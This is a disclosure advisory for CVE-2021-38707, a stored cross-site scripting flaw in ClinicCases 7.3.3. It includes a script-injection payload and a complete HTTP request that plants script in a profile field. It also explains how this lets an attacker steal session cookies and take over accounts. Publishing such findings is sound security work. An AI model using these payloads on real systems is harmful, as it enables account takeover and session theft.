# CVE-2021-38707
## Persistent Cross-Site Scripting (XSS) in ClinicCases 7.3.3 

Persistent cross-site scripting (XSS) vulnerabilities in ClinicCases
7.3.3 allow low-privileged attackers to introduce arbitrary JavaScript
to account parameters. The XSS payloads will execute in the browser of
any user who views the relevant content. This can result in account
takeover via session token theft.

### Detail

Arbitrary JavaScript can be injected into multiple areas of the application, which will be stored on the page and executed by a victim when loaded. For example, a student can inject code to their username fields:

```html
a<script>alert(document.cookie)</script>
```

![image](https://user-images.githubusercontent.com/52385049/132094249-9647ada2-9b27-4ba2-a948-bd1c49206623.png)

```http
POST /cliniccases/lib/php/users/preferences_process.php HTTP/1.1
Host: cliniccases.local
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 157
Origin: http://cliniccases.local
Connection: close
Referer: http://cliniccases.local/cliniccases/index.php?i=Home.php

first_name=student&last_name=a%3Cscript%3Ealert(1)%3C%2Fscript%3E&mobile_phone=&home_phone=&office_phone=&email=user%40example.com&id=2&action=update_profile
```

When an administrator (or any other user) views a page containing this field, the attacker-defined code will execute. As the `PHPSESSID` session cookie is insufficiently protected, it can be stolen by malicious JavaScript. This can be used for account takeover and session riding attacks - as observed with the `alert(document.cookie)` payload.

![image](https://user-images.githubusercontent.com/52385049/132094271-c2a9c63b-3740-4454-b96a-06474475cf74.png)
